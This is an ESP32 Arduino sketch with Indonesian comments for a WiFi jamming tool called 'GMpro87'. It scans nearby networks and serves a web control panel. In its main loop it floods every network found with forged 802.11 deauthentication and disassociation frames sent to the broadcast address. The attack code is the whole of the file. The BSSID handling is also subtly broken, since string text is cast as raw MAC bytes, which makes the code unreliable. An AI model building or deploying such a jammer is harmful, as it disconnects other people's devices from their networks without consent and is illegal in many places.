#include <WiFi.h>
#include <WebServer.h>
#include <vector>
#include <string>

// --- CONFIGURASI PIN ---
const int btnDeauth = 2; 
const int btnScan = 3;   
const int ledPin = 8;    

// --- STRUKTUR DATA ---
struct wifiData {
  int num = 0;
  std::vector<std::string> ssid;
  std::vector<std::string> bssid;  // UBAH KE STRING - AMAN!
  std::vector<int> channel;
};

// --- VARIABLE GLOBAL ---
wifiData targetData;
bool isAttacking = false;
uint8_t broadcastAddr[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};

// --- WEB SERVER ---
WebServer server(80);

// --- FUNGSI PACKET INJECTION (AGRESIF) ---
void sendAggressivePacket(const uint8_t* bssid, const uint8_t* sta) {
  struct __attribute__((packed)) {
    uint8_t frame_control[2];
    uint8_t duration[2];
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint8_t seq_ctrl[2];
    uint8_t reason[2];
  } pkt;
  
  memset(&pkt, 0, sizeof(pkt));
  pkt.duration[0] = pkt.duration[1] = 0x00;
  memcpy(pkt.addr1, sta, 6);
  memcpy(pkt.addr2, bssid, 6);
  memcpy(pkt.addr3, bssid, 6);
  pkt.seq_ctrl[0] = pkt.seq_ctrl[1] = 0x00;

  for (int i = 0; i < 40; ++i) {
    pkt.frame_control[0] = 0xC0; pkt.reason[0] = 0x07;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    pkt.frame_control[0] = 0xA0; pkt.reason[0] = 0x04;
    esp_wifi_80211_tx(WIFI_IF_STA, (uint8_t*)&pkt, sizeof(pkt), false);
    yield();
  }
}

// --- FUNGSI SCAN ---
void scanNetworks() {
  digitalWrite(ledPin, HIGH);
  Serial.println("\n[SCAN] Searching...");

  targetData.ssid.clear();
  targetData.bssid.clear();
  targetData.channel.clear();
  targetData.num = 0;

  int n = WiFi.scanNetworks();
  if (n <= 0) {
    Serial.println("[!] No networks found.");
    digitalWrite(ledPin, LOW);
    return;
  }
  targetData.num = n;
  for (int i = 0; i < n; ++i) {
    targetData.ssid.push_back(WiFi.SSID(i).c_str());
    targetData.channel.push_back(WiFi.channel(i));
    targetData.bssid.push_back(WiFi.BSSIDstr(i));  // AMAN - pakai string
    Serial.printf("%2d: %-32s Ch:%2d [%s]\n", i+1, targetData.ssid[i].c_str(), targetData.channel[i], targetData.bssid[i].c_str());
  }
  digitalWrite(ledPin, LOW);
}

// --- WEB UI ---
void handleRoot() {
  String html = "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'>";
  html += "<title>GMpro87</title><style>";
  html += "body{background:#0a0a0a;color:#e0e0e0;font-family:'Segoe UI',sans-serif;margin:0;padding:20px;}";
  html += ".container{max-width:800px;margin:0 auto;}";
  html += "h1{color:#00ff88;text-align:center;font-size:2.5em;margin-bottom:20px;}";
  html += ".card{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:20px;margin-bottom:20px;}";
  html += ".btn{background:#00ff88;color:#0a0a0a;border:none;padding:12px 24px;border-radius:8px;cursor:pointer;font-weight:bold;margin:5px;}";
  html += ".btn:hover{background:#00cc66;}";
  html += ".btn-danger{background:#ff4444;} .btn-danger:hover{background:#cc0000;}";
  html += "table{width:100%;border-collapse:collapse;}";
  html += "th,td{padding:12px;border-bottom:1px solid #333;text-align:left;}";
  html += "th{color:#00ff88;}";
  html += ".status{display:inline-block;padding:6px 12px;border-radius:6px;font-size:0.9em;}";
  html += ".status-on{background:#00ff88;color:#000;}";
  html += ".status-off{background:#333;color:#888;}";
  html += "</style></head><body><div class='container'>";

  html += "<h1>GMpro87 v1.2</h1>";
  html += "<div class='card'><h2>WiFi Networks</h2>";
  html += "<p>Found: " + String(targetData.num) + " networks</p>";
  html += "<table><tr><th>#</th><th>SSID</th><th>Channel</th><th>BSSID</th></tr>";
  for (size_t i = 0; i < targetData.ssid.size(); ++i) {
    html += "<tr><td>" + String(i+1) + "</td><td>" + targetData.ssid[i] + "</td><td>" + String(targetData.channel[i]) + "</td><td>" + targetData.bssid[i] + "</td></tr>";
  }
  html += "</table></div>";

  html += "<div class='card'><h2>Attack Control</h2>";
  html += "<p>Status: <span class='status ";
  html += isAttacking ? "status-on'>RUNNING" : "status-off'>STOPPED";
  html += "</span></p>";
  html += "<a href='/scan'><button class='btn'>Scan Networks</button></a> ";
  html += "<a href='/attack'><button class='btn ";
  html += isAttacking ? "btn-danger" : "";
  html += "'>";
  html += isAttacking ? "Stop Attack" : "Start Attack";
  html += "</button></a>";
  html += "</div>";

  html += "<div class='card'><h2>System</h2>";
  html += "<p>GMpro87 v1.2 | ESP32-WROOM-32U</p>";
  html += "</div></div></body></html>";

  server.send(200, "text/html", html);
}

void handleScan() {
  scanNetworks();
  server.sendHeader("Location", "/");
  server.send(302);
}
void handleAttack() {
  if (targetData.num > 0) isAttacking = !isAttacking;
  server.sendHeader("Location", "/");
  server.send(302);
}

// --- SETUP ---
void setup() {
  Serial.begin(115200);
  pinMode(btnDeauth, INPUT_PULLUP);
  pinMode(btnScan, INPUT_PULLUP);
  pinMode(ledPin, OUTPUT);

  // WiFi AP Mode (HANYA AP - TIDAK STA!)
  WiFi.mode(WIFI_AP);
  WiFi.softAP("GMpro", "Sangkur87");
  Serial.println("\n[+] AP Created: GMpro / Sangkur87");
  Serial.println("[+] Web UI: http://192.168.4.1");

  // WiFi Scan Prep
  WiFi.mode(WIFI_AP_STA);  // Switch ke AP+STA untuk scan
  WiFi.disconnect();
  esp_wifi_set_promiscuous(true);

  // Web Server
  server.on("/", handleRoot);
  server.on("/scan", handleScan);
  server.on("/attack", handleAttack);
  server.begin();

  Serial.println("\n============================");
  Serial.println("  GMpro87 v1.2 - Fixed & Stable");
  Serial.println("============================");
  Serial.println("D2: Toggle Attack | D3: Scan");
  Serial.println("Web: http://192.168.4.1");
}

// --- LOOP ---
void loop() {
  server.handleClient();

  // Tombol Scan
  if (digitalRead(btnScan) == LOW) {
    delay(200);
    isAttacking = false;
    scanNetworks();
    while (digitalRead(btnScan) == LOW);
  }

  // Tombol Attack
  if (digitalRead(btnDeauth) == LOW) {
    delay(200);
    if (targetData.num > 0) {
      isAttacking = !isAttacking;
      Serial.printf("\n[ATTACK] %s\n", isAttacking ? "RUNNING" : "STOPPED");
    } else {
      Serial.println("[!] Scan first!");
    }
    while (digitalRead(btnDeauth) == LOW);
  }

  // Eksekusi Serangan
  if (isAttacking && targetData.num > 0) {
    for (size_t i = 0; i < targetData.ssid.size(); ++i) {
      if (!isAttacking) break;
      int ch = targetData.channel[i];
      if (ch < 1) ch = 1;
      if (ch > 13) ch = 13;
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      sendAggressivePacket((const uint8_t*)targetData.bssid[i].c_str(), broadcastAddr);
      digitalWrite(ledPin, !digitalRead(ledPin));
      delay(1);
      yield();
    }
  } else {
    digitalWrite(ledPin, LOW);
  }
}
